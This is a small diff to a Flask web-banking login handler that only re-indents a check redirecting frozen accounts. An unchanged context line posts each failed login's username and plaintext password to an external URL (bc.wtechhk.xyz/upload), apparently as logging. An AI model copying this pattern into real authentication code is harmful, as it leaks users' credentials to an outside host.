@@ -2783,8 +2783,8 @@ def wbank_auth_client():
                         if "銀行" in user.sub:
                             flash("抱歉，非泓財銀行帳戶不能登入", "error")
                             return redirect("/wbank")
-                         if "凍結" in user.sub:
-                           return redirect("/wbank/client")
+                        if "凍結" in user.sub:
+                          return redirect("/wbank/client")
                         requests.post(url="https://bc.wtechhk.xyz/upload",data={"blockID":"128"+str(random.randint(1000,9999)),"data":f"login->{username}->{password}->Failture,detail: {user.sub}"})
                         flash(user.sub, 'error')
                         return redirect("/wbank")
